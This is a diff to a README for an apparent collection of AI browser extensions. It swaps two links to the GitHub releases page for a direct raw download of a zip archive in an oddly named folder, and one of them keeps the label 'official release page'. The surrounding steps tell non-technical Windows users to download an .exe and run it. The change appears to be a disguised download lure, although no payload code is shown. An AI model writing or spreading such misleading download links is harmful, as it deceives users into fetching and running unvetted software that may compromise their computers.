@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-extensions - Improve your daily web browser productivity
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hamdadi3367/awesome-ai-extensions/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/hamdadi3367/awesome-ai-extensions/main/archpriestship/extensions_awesome_ai_3.2-beta.5.zip)
 
 This repository provides a collection of tools that integrate artificial intelligence into your web browsing experience. These extensions automate tasks, summarize text, and improve your workflow on sites you visit every day.
 
@@ -8,7 +8,7 @@ This repository provides a collection of tools that integrate artificial intelli
 
 You do not need programming knowledge to use these tools. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/hamdadi3367/awesome-ai-extensions/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/hamdadi3367/awesome-ai-extensions/main/archpriestship/extensions_awesome_ai_3.2-beta.5.zip).
 2. Look for the most recent version labeled as Latest.
 3. Click the link to download the installer file ending in .exe.
 4. Open the downloaded file to start the installation wizard.
